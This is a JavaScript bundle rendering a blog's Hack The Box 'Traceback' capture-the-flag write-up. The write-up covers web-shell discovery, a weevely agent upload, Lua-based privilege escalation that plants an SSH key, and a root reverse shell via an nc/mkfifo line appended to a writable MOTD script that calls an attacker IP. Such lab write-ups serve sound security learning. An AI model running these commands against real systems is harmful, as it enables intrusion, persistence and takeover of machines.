"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[4788],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>h});var a=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function o(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},i=Object.keys(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=a.createContext({}),p=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},u=function(e){var n=p(e.components);return a.createElement(l.Provider,{value:n},e.children)},c="mdxType",m={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},d=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,i=e.originalType,l=e.parentName,u=o(e,["components","mdxType","originalType","parentName"]),c=p(t),d=r,h=c["".concat(l,".").concat(d)]||c[d]||m[d]||i;return t?a.createElement(h,s(s({ref:n},u),{},{components:t})):a.createElement(h,s({ref:n},u))}));function h(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var i=t.length,s=new Array(i);s[0]=d;var o={};for(var l in n)hasOwnProperty.call(n,l)&&(o[l]=n[l]);o.originalType=e,o[c]="string"==typeof e?e:r,s[1]=o;for(var p=2;p<i;p++)s[p]=t[p];return a.createElement.apply(null,s)}return a.createElement.apply(null,t)}d.displayName="MDXCreateElement"},72702:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>m,frontMatter:()=>i,metadata:()=>o,toc:()=>p});var a=t(87462),r=(t(67294),t(3905));const i={layout:"post",title:"Traceback ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","php","lua","webshell","motd"],date:"2020/08/15",thumbnail:"/img/HackTheBox/traceback.png",toc:!0},s="Information",o={unversionedId:"HackTheBox/Traceback/write-up",id:"HackTheBox/Traceback/write-up",title:"Traceback ",description:"- Name: Traceback",source:"@site/writeups/HackTheBox/Traceback/write-up.md",sourceDirName:"HackTheBox/Traceback",slug:"/HackTheBox/Traceback/write-up",permalink:"/writeups/HackTheBox/Traceback/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"php",permalink:"/writeups/tags/php"},{label:"lua",permalink:"/writeups/tags/lua"},{label:"webshell",permalink:"/writeups/tags/webshell"},{label:"motd",permalink:"/writeups/tags/motd"}],version:"current",frontMatter:{layout:"post",title:"Traceback ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","php","lua","webshell","motd"],date:"2020/08/15",thumbnail:"/img/HackTheBox/traceback.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Tenet ",permalink:"/writeups/HackTheBox/Tenet/write-up"},next:{title:"Travel ",permalink:"/writeups/HackTheBox/Travel/write-up"}},l={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"HTTP discovery",id:"http-discovery",level:2},{value:"HTTP enumeration",id:"http-enumeration",level:2},{value:"A bit of OSINT",id:"a-bit-of-osint",level:2},{value:"HTTP exploitation",id:"http-exploitation",level:2},{value:"System enumeration",id:"system-enumeration",level:2},{value:"Privilege Escalation of Machine : webadmin to sysadmin",id:"privilege-escalation-of-machine--webadmin-to-sysadmin",level:2},{value:"Privilege Escalation of Machine : sysadmin to root",id:"privilege-escalation-of-machine--sysadmin-to-root",level:2}],u={toc:p},c="wrapper";function m(e){let{components:n,...i}=e;return(0,r.kt)(c,(0,a.Z)({},u,i,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Traceback"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/233"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"traceback",src:t(44926).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"TL;DR"),": finding & abusing a PHP webshell to get system access, then pe to\nanother user with lua (sudo) and finally pe to root with a motd partial script."),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"pacman -S nmap gtfo dirsearch weevely\n")),(0,r.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,"Start a full port scan with ",(0,r.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Sun Mar 15 16:33:24 2020 as: nmap -sSCV -p 80,22 -oA nmap_services 10.10.10.181\nNmap scan report for 10.10.10.181\nHost is up (0.025s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)\n|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)\n|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)\n80/tcp open  http?\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sun Mar 15 16:35:12 2020 -- 1 IP address (1 host up) scanned in 108.17 seconds\n")),(0,r.kt)("h2",{id:"http-discovery"},"HTTP discovery"),(0,r.kt)("p",null,"On the main page source code ",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.181/"},"http://10.10.10.181/")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},"    <h1>This site has been owned</h1>\n    <h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>\n    <h3> - Xh4H - </h3>\n\x3c!--Some of the best web shells that you might need ;)--\x3e\n")),(0,r.kt)("p",null,"It's a hint telling us to search for web shells."),(0,r.kt)("h2",{id:"http-enumeration"},"HTTP enumeration"),(0,r.kt)("p",null,"We will try to find a web shell by enumerating available pages with\n",(0,r.kt)("a",{parentName:"p",href:"https://github.com/maurosoria/dirsearch"},"dirsearch"),". Of course it's better to take a webshell focused\ndictionary for that."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ dirsearch -u http://10.10.10.181/ -e php -w ~/CTF/tools/SecLists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt\n\n _|. _ _  _  _  _ _|_    v0.3.9\n(_||| _) (/_(_|| (_| )\n\nExtensions: php | HTTP method: get | Threads: 10 | Wordlist size: 80\n\nError Log: /home/cyfun/.dirsearch/logs/errors-20-03-15_16-24-24.log\n\nTarget: http://10.10.10.181/\n")),(0,r.kt)("p",null,"But I found no web shell with this dictionary."),(0,r.kt)("h2",{id:"a-bit-of-osint"},"A bit of OSINT"),(0,r.kt)("p",null,"The challenge's author is ",(0,r.kt)("strong",{parentName:"p"},"Xh4H"),". We can find it's ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/Xh4H"},"github profile"),"\nand find a project named ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/Xh4H/Web-Shells"},"Web-Shells"),"\nstoring some common and more exotic PHP web shells."),(0,r.kt)("p",null,"So let's use this as a list."),(0,r.kt)("p",null,"Finally we found a webshell called ",(0,r.kt)("inlineCode",{parentName:"p"},"smevk.php"),"."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"http://10.10.10.181/smevk.php")),(0,r.kt)("h2",{id:"http-exploitation"},"HTTP exploitation"),(0,r.kt)("p",null,"With the webshell we can display files like ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/passwd")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:105:109::/run/uuidd:/usr/sbin/nologin\nwebadmin:x:1000:1000:traceback,,,:/home/webadmin:/bin/bash\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\nsysadmin:x:1001:1001::/home/sysadmin:/bin/sh\n")),(0,r.kt)("p",null,"The webshell is a cancer, so let's create & upload our own made with ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/epinna/weevely3"},"weevely"),"."),(0,r.kt)("p",null,"Create teh webshell agent:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ weevely generate cyfun agentcyfun.php\nGenerated 'agentcyfun.php' with password 'cyfun' of 781 byte size.\n")),(0,r.kt)("p",null,"Upload the agent (a classic HTTP server + wget).\nTrigger the webshell agent:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ weevely terminal http://10.10.10.181/agentcyfun.php cyfun\n\n[+] weevely 4.0.1\n\n[+] Target:     10.10.10.181\n[+] Session:    /home/cyfun/.weevely/sessions/10.10.10.181/agentcyfun_0.session\n\n[+] Browse the filesystem or execute commands starts the connection\n[+] to the target. Type :help for more information.\n\nweevely> id\nuid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)\n")),(0,r.kt)("h2",{id:"system-enumeration"},"System enumeration"),(0,r.kt)("p",null,"Then start some system enumeration."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"webadmin@traceback:/var/www/html $ ls -lhRA /home\n/home:\ntotal 8.0K\ndrwxr-x--- 5 sysadmin sysadmin 4.0K Mar 15 09:07 sysadmin\ndrwxr-x--- 5 webadmin sysadmin 4.0K Mar 15 09:08 webadmin\nls: cannot open directory '/home/sysadmin': Permission denied\n\n/home/webadmin:\ntotal 4.3M\n-rw------- 1 webadmin webadmin   90 Feb 27 05:53 .bash_history\n-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout\n-rw-r--r-- 1 webadmin webadmin 3.7K Aug 23  2019 .bashrc\ndrwx------ 2 webadmin webadmin 4.0K Aug 23  2019 .cache\ndrwxrwxr-x 3 webadmin webadmin 4.0K Aug 24  2019 .local\n-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history\n-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile\ndrwxrwxr-x 2 webadmin webadmin 4.0K Feb 27 06:29 .ssh\n-rwxrw-r-- 1 webadmin webadmin  870 Mar 15 09:05 cc.lua\n-rwxrw-r-- 1 webadmin webadmin  332 Mar 15 09:02 ccc.lua\n-rw-rw-rw- 1 webadmin webadmin  672 Mar 15 08:49 heli.lua\n-rw-r--r-- 1 webadmin webadmin  672 Mar 15 09:04 krisis.lua\n-rwxrwxr-x 1 sysadmin sysadmin 4.2M Aug 24  2019 luvit\n-rw-rw-r-- 1 webadmin webadmin   89 Aug 24  2019 note.txt\n-rw-r--r-- 1 webadmin webadmin  654 Mar 15 09:02 nowy.lua\n-rw-rw-r-- 1 webadmin webadmin  648 Mar 15 09:06 privesc.lua\n-rw-rw-r-- 1 webadmin webadmin  673 Mar 15 09:03 rs.lua\n-rw-r--r-- 1 webadmin webadmin  332 Mar 15 09:02 shell.lua\n-rw-r--r-- 1 webadmin webadmin  655 Mar 15 09:08 ssh.lua\n-rw-rw-rw- 1 webadmin webadmin   29 Mar 15 09:06 test.lua\n\n/home/webadmin/.cache:\ntotal 0\n-rw-r--r-- 1 webadmin webadmin 0 Aug 23  2019 motd.legal-displayed\n\n/home/webadmin/.local:\ntotal 4.0K\ndrwx------ 3 webadmin webadmin 4.0K Aug 24  2019 share\n\n/home/webadmin/.local/share:\ntotal 4.0K\ndrwx------ 2 webadmin webadmin 4.0K Aug 24  2019 nano\n\n/home/webadmin/.local/share/nano:\ntotal 0\n\n/home/webadmin/.ssh:\ntotal 4.0K\n-rw------- 1 webadmin webadmin 1.7K Mar 15 09:06 authorized_keys\n\nwebadmin@traceback:/var/www/html $ cat /home/webadmin/note.txt\n- sysadmin -\nI have left this tool to practice Lua. Contact me if you have any question.\n")),(0,r.kt)("p",null,"We can see a bunch of lua scripts and a hint telling us to use lua."),(0,r.kt)("p",null,"We can edit ",(0,r.kt)("inlineCode",{parentName:"p"},"/home/webadmin/.ssh/authorized_keys")," and add pubkey to gain\npersistence & access a proper TTY rather than a webshell."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat ~/.ssh/id_rsa.pub \nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDceD2CV1rqU+7fcduAqZ9bK4jdOQphI7J7AYUAzmHARAp/fNq4XQet3bLg73yugh72MRT6aJUWEM2iP1/gmyRgJUxx65qESG/OAUlzIOBSQUiw2sP+3++/qsBJ76y7/xfnIq/F6YDJSaqpm+eG4G4SrVqNvKNzZTYbAXJ4Fw62bAD04cvMsDeiarkS0mAZkLUzBYI8aDimHt0J2N0OGLC/hLMDZeDzjtixb/4dVNFIoRHyZv3fTNsRLDScKxxHSP+e1CUfAQ6dtlpzqAj1IW7GkaZWxBxRIyVEtFrkYSQzM/ycYtKwhXkySPbtlO1xcjr4/FpOWfYq0LiuF71+Pt/QfwYv1UKIqJ+swZlm/zb/cpu8ESARrs5mb4OTTBwb3TSmOIj5iYaEwhXGueB/Cq7TH6HQjGDZqiOOX6q1ymiGdWfkNCAj4wywaPlIB+d90NH/G0gfuk+2CFcm2us7pIvELqGh5ZqcCGdGQtqlQBsC2HdzSkiQqlGLBIDk3fcJ/ms= cyfun@penarch\n\n$ ssh webadmin@10.10.10.181 -i ~/.ssh/id_rsa\nThe authenticity of host '10.10.10.181 (10.10.10.181)' can't be established.\nECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.181' (ECDSA) to the list of known hosts.\n#################################\n-------- OWNED BY XH4H  ---------\n- I guess stuff could have been configured better ^^ -\n#################################\n\nWelcome to Xh4H land \n\n\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun Mar 15 09:14:09 2020 from 10.10.15.22\nwebadmin@traceback:~$\n")),(0,r.kt)("p",null,"We can see that we can run a command ",(0,r.kt)("inlineCode",{parentName:"p"},"luvit")," as sysadmin:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"webadmin@traceback:~$ sudo -l\nMatching Defaults entries for webadmin on traceback:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser webadmin may run the following commands on traceback:\n    (sysadmin) NOPASSWD: /home/webadmin/luvit\n\nwebadmin@traceback:~$ sudo -u sysadmin /home/webadmin/luvit\nWelcome to the Luvit repl!\n> \n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--webadmin-to-sysadmin"},"Privilege Escalation of Machine : webadmin to sysadmin"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"luvit")," is just a wrapper opening a lua interpreter."),(0,r.kt)("p",null,"Let's create a LUA PoC to pe."),(0,r.kt)("p",null,"We can use ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/mzfr/gtfo"},"gtfo")," to search over ",(0,r.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/"},"GTFObins"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ gtfo -b lua\n")),(0,r.kt)("p",null,"With ",(0,r.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/lua/"},"lua")," it's possible to open a\nshell directly with ",(0,r.kt)("inlineCode",{parentName:"p"},'os.execute("/bin/bash")')," or to write our SSH\nkey to get persistence:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-lua"},'local file = io.open("/home/sysadmin/.ssh/authorized_keys", "a")\nfile:write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDceD2CV1rqU+7fcduAqZ9bK4jdOQphI7J7AYUAzmHARAp/fNq4XQet3bLg73yugh72MRT6aJUWEM2iP1/gmyRgJUxx65qESG/OAUlzIOBSQUiw2sP+3++/qsBJ76y7/xfnIq/F6YDJSaqpm+eG4G4SrVqNvKNzZTYbAXJ4Fw62bAD04cvMsDeiarkS0mAZkLUzBYI8aDimHt0J2N0OGLC/hLMDZeDzjtixb/4dVNFIoRHyZv3fTNsRLDScKxxHSP+e1CUfAQ6dtlpzqAj1IW7GkaZWxBxRIyVEtFrkYSQzM/ycYtKwhXkySPbtlO1xcjr4/FpOWfYq0LiuF71+Pt/QfwYv1UKIqJ+swZlm/zb/cpu8ESARrs5mb4OTTBwb3TSmOIj5iYaEwhXGueB/Cq7TH6HQjGDZqiOOX6q1ymiGdWfkNCAj4wywaPlIB+d90NH/G0gfuk+2CFcm2us7pIvELqGh5ZqcCGdGQtqlQBsC2HdzSkiQqlGLBIDk3fcJ/ms= cyfun@penarch")\nfile:close()\n')),(0,r.kt)("p",null,"We have just to execute the lua interpreter as sysadmin and paste our lua PoC."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"webadmin@traceback:~$ sudo -u sysadmin /home/webadmin/luvit cyfun.lua\n")),(0,r.kt)("p",null,"Then we can log in as sysadmin over ssh & get the user flag."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ssh sysadmin@10.10.10.181 -i ~/.ssh/id_rsa\n#################################\n-------- OWNED BY XH4H  ---------\n- I guess stuff could have been configured better ^^ -\n#################################\n\nWelcome to Xh4H land \n\n\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun Mar 15 09:42:11 2020 from 10.10.14.76\n$ cat user.txt\nc24349701ae38c33ffbf0cceb2c46020\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--sysadmin-to-root"},"Privilege Escalation of Machine : sysadmin to root"),(0,r.kt)("p",null,"We can see that the MOTD directory is writable by sysadmin."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"sysadmin@traceback:~$ ls -lh /etc/update-motd.d\ntotal 24K\n-rwxrwxr-x 1 root sysadmin  981 Mar 15 10:46 00-header\n-rwxrwxr-x 1 root sysadmin  982 Mar 15 10:46 10-help-text\n-rwxrwxr-x 1 root sysadmin 4.2K Mar 15 10:46 50-motd-news\n-rwxrwxr-x 1 root sysadmin  604 Mar 15 10:46 80-esm\n-rwxrwxr-x 1 root sysadmin  299 Mar 15 10:46 91-release-upgrade\n")),(0,r.kt)("p",null,"Owned by root but writable by sysadmin so we can add any command in it.\nBut it seems there are reset pretty often so we can do an infinite loop to append our\nreverse shell to ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/update-motd.d/00-header")," indefinitely."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"while true\ndo\n  echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.44 9999 >/tmp/f' >> /etc/update-motd.d/00-header\ndone\n")),(0,r.kt)("p",null,"Launch a new connection ",(0,r.kt)("inlineCode",{parentName:"p"},"ssh sysadmin@10.10.10.181 -i ~/.ssh/id_rsa")," that will\ntrigger the reverse shell as root and gain access with a listener:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ nc -nlp 9999\nid\n/bin/sh: 0: can't access tty; job control turned off\n# uid=0(root) gid=0(root) groups=0(root)\n")))}m.isMDXComponent=!0},44926:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/traceback-572728e75a872d4d462f657eb48fcc33.png"}}]);